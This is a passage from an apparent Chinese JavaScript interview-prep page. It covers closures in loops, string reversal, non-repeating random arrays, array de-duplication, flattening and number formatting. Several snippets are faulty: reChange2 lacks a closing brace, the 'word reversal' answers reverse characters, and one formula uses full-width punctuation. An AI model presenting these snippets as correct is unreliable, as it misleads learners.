         lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
             <span class="token function">alert</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
         <span class="token punctuation">&#125;</span>       
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>解决办法：</p>
<p>使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> lis <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lis<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">j</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                lis<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token function">alert</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>










<h3 id="JS应用篇"><a href="#JS应用篇" class="headerlink" title="JS应用篇"></a>JS应用篇</h3><h4 id="字符串中的单词逆序输出（手写）"><a href="#字符串中的单词逆序输出（手写）" class="headerlink" title="字符串中的单词逆序输出（手写）"></a>字符串中的单词逆序输出（手写）</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">"Hello My name is kif and i am from XTU"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">reChange1</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">reChange1</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">"Hello My name is kif and i am from XTU"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">reChange2</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newSTr <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> str<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    newSTr <span class="token operator">+=</span> str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> newSTr

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">reChange2</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组"><a href="#function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组" class="headerlink" title="function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组"></a>function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</h4><p><strong>参考答案：</strong></p>
<p>把考点拆成了4个小项；需要用递归算法实现：<br>a) 生成一个长度为n的空数组arr。<br>b) 生成一个（min－max）之间的随机整数rand。<br>c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]<br>d) 最终输出一个长度为n，且内容不重复的数组arr。</p>
<h4 id="Math-random"><a href="#Math-random" class="headerlink" title="Math.random"></a>Math.random</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//产生一个[0，1)之间的随机数。</span>
Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：
 
<span class="token comment">//返回指定范围的随机数(m-n之间)的公式:</span>
Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">+</span>m；
或者
Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">+</span>m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">buildArray</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> min<span class="token punctuation">,</span> max</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> num <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> min <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> arr<span class="token punctuation">.</span>length <span class="token operator">===</span> n <span class="token operator">?</span> arr <span class="token operator">:</span> <span class="token function">buildArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> n<span class="token punctuation">,</span> min<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">buildArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> <span class="token constant">N</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token constant">N</span><span class="token punctuation">;</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// console.log(l);</span>
    <span class="token keyword">let</span> r <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max <span class="token operator">-</span> min<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
      arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
      l<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> arr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"><a href="#实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路" class="headerlink" title="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"></a>实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</h4><p><strong>参考答案</strong>：</p>
<p><strong>1.遍历数组法</strong></p>
<p>它是最简单的数组去重方法（indexOf方法）</p>
<p>实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">unique1</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> hash<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>hash<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      hash<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>2.数组下标判断法</strong></p>
<p>调用indexOf方法，性能和方法1差不多</p>
<p>实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">unique2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> hash<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      hash<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>3.排序后相邻去除法</strong></p>
<p>实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">unique3</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> hash<span class="token operator">=</span><span class="token punctuation">[</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>hash<span class="token punctuation">[</span>hash<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      hash<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>4.优化遍历数组法（推荐）</strong></p>
<p>实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length</p>
<p>将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">unique4</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> hash<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">===</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token operator">++</span>i<span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
      hash<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>5.ES6实现</strong></p>
<p>基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。</p>
<p>Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">unique5</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>扩展：如果重复，则去掉该元素</p>
<p>数组下标去重</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">unique22</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> hash<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span>arr<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      hash<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="传入-1-2-3-4-5-，返回-1-2-3-4-5"><a href="#传入-1-2-3-4-5-，返回-1-2-3-4-5" class="headerlink" title="传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]"></a>传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> list <span class="token operator">=</span> x<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> ans <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// console.log(i)</span>
    <span class="token keyword">return</span> <span class="token keyword">typeof</span> i <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">?</span> <span class="token function">Number</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">:</span> i<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// console.log(ans)</span>
  <span class="token keyword">return</span> ans<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​       </p>
<p>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2, [3, 4]]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 方法4</span>
<span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">flatten</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> arr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">flatten</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="用正则和非正则实现12345678-12-x3D-》12，345，678-12"><a href="#用正则和非正则实现12345678-12-x3D-》12，345，678-12" class="headerlink" title="用正则和非正则实现12345678.12&#x3D;》12，345，678.12"></a>用正则和非正则实现12345678.12&#x3D;》12，345，678.12</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">12345678.12</span>
<span class="token comment">//12,345,678.12</span>
<span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token parameter">number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> s <span class="token operator">=</span> number<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">//console.log(s)</span>
    <span class="token keyword">let</span> <span class="token constant">L</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> num_s
    <span class="token constant">L</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> num_s <span class="token operator">=</span> <span class="token constant">L</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> num_s <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">let</span> <span class="token constant">N</span><span class="token operator">=</span><span class="token constant">L</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> num_f
    <span class="token keyword">let</span> y <span class="token operator">=</span><span class="token constant">N</span><span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">3</span>
